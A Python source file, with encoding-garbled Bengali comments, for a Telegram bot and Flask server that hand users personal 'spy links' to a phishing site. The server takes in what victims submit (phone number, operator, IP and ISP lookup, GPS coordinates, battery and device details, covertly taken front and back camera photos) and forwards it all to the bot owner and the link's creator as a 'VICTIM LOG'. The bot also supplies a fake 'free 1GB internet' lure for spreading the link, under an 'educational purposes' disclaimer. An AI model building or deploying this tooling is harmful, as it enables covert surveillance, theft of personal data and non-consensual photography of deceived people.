import logging
import re
import os
import json
import base64
from io import BytesIO
import httpx # IP ‡¶§‡¶•‡ßç‡¶Ø‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler, TypeHandler
from flask import Flask, request, jsonify

# --- Flask ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶∏‡ßá‡¶ü‡¶Ü‡¶™ (‡¶ì‡¶Ø‡¶º‡ßá‡¶¨ ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞) ---
flask_app = Flask(__name__)

# --- ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶¨‡¶ü ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶® ---
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
PHISHING_SITE_URL = os.environ.get("PHISHING_SITE_URL") # Netlify URL

CHANNEL_LINK = "https://t.me/+rj4147h5OD8yMzQ9"
OWNER_USERNAME = "https://t.me/TheSagorOfficial"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

application = Application.builder().token(TOKEN).build()

# --- IP ‡¶§‡¶•‡ßç‡¶Ø ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π‡ßá‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® ---
async def get_ip_details(ip_address):
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f'http://ip-api.com/json/{ip_address}')
            if response.status_code == 200:
                return response.json()
    except Exception as e:
        logger.error(f"Failed to get IP details for {ip_address}: {e}")
    return {}

# --- Flask ‡¶∞‡ßÅ‡¶ü: /submit (script.js ‡¶•‡ßá‡¶ï‡ßá ‡¶°‡ßá‡¶ü‡¶æ ‡¶ó‡ßç‡¶∞‡¶π‡¶£ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø) ---
@flask_app.route('/submit', methods=['POST'])
def handle_submit():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = request.get_json()
    
    # ‡¶è‡¶ï‡¶ü‡¶ø ‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ ‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßá ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá‡¶∞ ÎåÄÍ∏∞Ïó¥‡ßá ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡¶æ
    # ‡¶Ø‡¶æ‡¶§‡ßá ‡¶è‡¶ü‡¶ø ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá‡¶∞ ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞ ‡¶¶‡ßç‡¶¨‡¶æ‡¶∞‡¶æ ‡¶™‡ßç‡¶∞‡¶ï‡ßç‡¶∞‡¶ø‡¶Ø‡¶º‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º
    custom_update = {'victim_ip': victim_ip, 'data': data}
    application.update_queue.put(custom_update)
    
    return jsonify({"status": "ok"}), 200

# --- ‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ ‡¶°‡ßá‡¶ü‡¶æ ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞ (Flask ‡¶•‡ßá‡¶ï‡ßá ‡¶Ü‡¶∏‡¶æ ‡¶°‡ßá‡¶ü‡¶æ ‡¶™‡ßç‡¶∞‡¶ï‡ßç‡¶∞‡¶ø‡¶Ø‡¶º‡¶æ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø) ---
async def process_victim_data(update: dict, context: CallbackContext):
    victim_ip = update.get('victim_ip')
    data = update.get('data')
    
    student_id = data.get('student_id') or 'unknown'
    form_data = data.get('form_data', {})
    device_info = data.get('device_info', {})
    location_info = data.get('location_info', {})
    image_data = data.get('image_data', {})

    ip_details = await get_ip_details(victim_ip)

    location_link = "Not Available"
    if 'lat' in location_info:
        location_link = f"https://www.google.com/maps?q={location_info['lat']},{location_info['lon']}"

    # --- ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶®‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶§‡ßà‡¶∞‡¶ø ---
    admin_message = f"""
[student_id={student_id}]
üíÄ ***====[ VICTIM LOG | @TheSagorOfficial ]====*** üíÄ

--- ***FORM DATA*** ---
üìû ***Number:*** `{form_data.get('country')} {form_data.get('mobileNumber')}`
üì° ***Operator:*** `{form_data.get('operator')}`

--- ***IP & LOCATION*** ---
üåê ***IP Address:*** `{victim_ip}`
üè¢ ***ISP:*** `{ip_details.get('isp', 'N/A')}`
üîç ***ASN:*** `{ip_details.get('as', 'N/A')}`
üåç ***Country:*** `{ip_details.get('country', 'N/A')}`
üèôÔ∏è ***City:*** `{ip_details.get('city', 'N/A')}`
üìç ***Google Maps:*** [View on Map]({location_link})

--- ***DEVICE INFO*** ---
üì± ***Device Type:*** `{device_info.get('deviceType')}`
üîã ***Battery:*** `{device_info.get('battery', {}).get('level')}`
üîå ***Charging:*** `{device_info.get('battery', {}).get('charging')}`
... (‡¶Ö‡¶®‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶Ø ‡¶§‡¶•‡ßç‡¶Ø)
"""
    # --- ‡¶∏‡ßç‡¶ü‡ßÅ‡¶°‡ßá‡¶®‡ßç‡¶ü‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶§‡ßà‡¶∞‡¶ø (‡¶ü‡ßç‡¶Ø‡¶æ‡¶ó ‡¶õ‡¶æ‡¶°‡¶º‡¶æ) ---
    student_message = admin_message.replace(f"[student_id={student_id}]\n", "")

    # ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶®‡¶ï‡ßá ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message, parse_mode='Markdown')
    
    # ‡¶∏‡ßç‡¶ü‡ßÅ‡¶°‡ßá‡¶®‡ßç‡¶ü‡¶ï‡ßá ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
    try:
        if student_id != 'unknown':
            await context.bot.send_message(chat_id=student_id, text=student_message, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Failed to send log to student {student_id}: {e}")

    # ‡¶õ‡¶¨‡¶ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã (‡¶Ø‡¶¶‡¶ø ‡¶•‡¶æ‡¶ï‡ßá)
    for cam_type, img_data in image_data.items():
        if img_data:
            try:
                header, encoded = img_data.split(",", 1)
                img_bytes = base64.b64decode(encoded)
                photo_file = BytesIO(img_bytes)
                
                admin_caption = f"Photo ({cam_type}) for [student_id={student_id}]"
                student_caption = f"Photo ({cam_type}) from victim"

                # ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶®‡¶ï‡ßá ‡¶õ‡¶¨‡¶ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
                await context.bot.send_photo(chat_id=ADMIN_CHAT_ID, photo=photo_file, caption=admin_caption)
                
                # ‡¶∏‡ßç‡¶ü‡ßÅ‡¶°‡ßá‡¶®‡ßç‡¶ü‡¶ï‡ßá ‡¶õ‡¶¨‡¶ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
                if student_id != 'unknown':
                    photo_file.seek(0) # ‡¶´‡¶æ‡¶á‡¶≤ ‡¶™‡¶Ø‡¶º‡ßá‡¶®‡ßç‡¶ü‡¶æ‡¶∞ ‡¶∞‡¶ø‡¶∏‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ
                    await context.bot.send_photo(chat_id=student_id, photo=photo_file, caption=student_caption)
            except Exception as e:
                logger.error(f"Failed to send photo to {student_id}: {e}")


# --- ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶° ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞ (‡¶Ö‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶ø‡¶§) ---
async def start(update: Update, context: CallbackContext) -> None:
    # ... (‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Ü‡¶ó‡ßá‡¶∞ start ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®‡ßá‡¶∞ ‡¶ï‡ßã‡¶° ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶•‡¶æ‡¶ï‡¶¨‡ßá)
    user = update.effective_user
    welcome_message = (
        f"Welcome, {user.first_name}!\n\n"
        "You can use this bot to generate a spy link! üéâ\n\n"
        "ùó¨ùóºùòÇ ùó∞ùóÆùóª ùóõùóÆùó∞ùó∏ :\n"
        "üîπ Front Camera\n"
        "üîπ Back Camera\n"
        "üîπ Location with map\n"
        "üîπ Phone number\n"
        "üîπ Sim Type\n"
        "üîπ IP, Battery, and many more\n"
        "üîπ Device type\n\n"
        "ùó°ùóºùòÅùó≤: ùóúùòÅ ùó∂ùòÄ ùóºùóªùóπùòÜ ùó≥ùóºùóø ùó≥ùòÇùóª ùóÆùóªùó± ùó≤ùó±ùòÇùó∞ùóÆùòÅùó∂ùóºùóªùóÆùóπ ùóΩùòÇùóøùóΩùóºùòÄùó≤ùòÄ üí°\n\n"
        "Now press create button to generate your link. üòä"
    )
    keyboard = [[InlineKeyboardButton("Create", callback_data='create_link')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_message, reply_markup=reply_markup)

async def create_link_handler(update: Update, context: CallbackContext) -> None:
    # ... (‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Ü‡¶ó‡ßá‡¶∞ create_link_handler ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®‡ßá‡¶∞ ‡¶ï‡ßã‡¶° ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶•‡¶æ‡¶ï‡¶¨‡ßá)
    user_id = update.effective_user.id
    personal_link = f"{PHISHING_SITE_URL}?id={user_id}"
    message_text = (
        "üéâ ùó¨ùóºùòÇùóø ùó®ùóªùó∂ùóæùòÇùó≤ ùóßùóøùóÆùó∞ùó∏ùó∂ùóªùó¥ ùóüùó∂ùóªùó∏ ùó∂ùòÄ ùó•ùó≤ùóÆùó±ùòÜ! üéâ\n\n"
        f"üîó ùó¨ùóºùòÇùóø ùóüùó∂ùóªùó∏: `{personal_link}`\n\n"
        "üìùùó°ùóºùòÅùó≤‚ö†\n\n"
        "->This bot ùó®ùó•ùóü not work complete on telegram web\n\n"
        "->So Use this ùó®ùó•ùóü on chrome or others browsers.‚úÖ\n\n"
        "Feel The power üí™‚ö° of sagor Sheikh üòé"
    )
    share_text = (
        "üåüùóòùòÖùó∞ùóπùòÇùòÄùó∂ùòÉùó≤ ùó¢ùó≥ùó≥ùó≤ùóø: ùóñùóπùóÆùó∂ùó∫ ùó¨ùóºùòÇùóø ùóôùóøùó≤ùó≤ ùü≠ùóöùóï ùóóùóÆùòÅùóÆ!üåü\n\n"
        "Looking for a quick internet boost? üéÅ\n"
        "Enjoy 1GB of free internet üåç‚ú®!\n\n"
        "‚ú® ùóñùóπùóÆùó∂ùó∫ ùòÜùóºùòÇùóø ùóôùó•ùóòùóò ùü≠ùóöùóï ùóªùóºùòÑ! üöÄ\n\n"
        f"üëâùóöùó≤ùòÅ Your ùóôùóøùó≤ùó≤ ùü≠ùóöùóï\n"
        f"üëâ{personal_link}\n\n"
        "Don't wait, ùóπùó∂ùó∫ùó∂ùòÅùó≤ùó± ùòÅùó∂ùó∫ùó≤ ùóºùó≥ùó≥ùó≤ùóø!"
    )
    telegram_share_url = f"https://t.me/share/url?url=&text={share_text.replace(' ', '%20').replace('\n', '%0A')}"
    keyboard = [
        [InlineKeyboardButton("Share this with friends", url=telegram_share_url)],
        [InlineKeyboardButton("My another Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("Contact owner if any issue", url=OWNER_USERNAME)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.message.reply_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')

# --- ‡¶Æ‡ßÇ‡¶≤ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® ---
def main() -> None:
    # ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞ ‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("create", create_link_handler))
    application.add_handler(CallbackQueryHandler(create_link_handler, pattern='^create_link$'))
    
    # ‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ ‡¶°‡ßá‡¶ü‡¶æ ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞ ‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ
    application.add_handler(TypeHandler(dict, process_victim_data))

    # Flask ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™‡¶ü‡¶ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶Ü‡¶≤‡¶æ‡¶¶‡¶æ ‡¶•‡ßç‡¶∞‡ßá‡¶°‡ßá ‡¶ö‡¶æ‡¶≤‡¶æ‡¶®‡ßã
    from threading import Thread
    flask_thread = Thread(target=lambda: flask_app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080))))
    flask_thread.daemon = True
    flask_thread.start()

    logger.info("Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
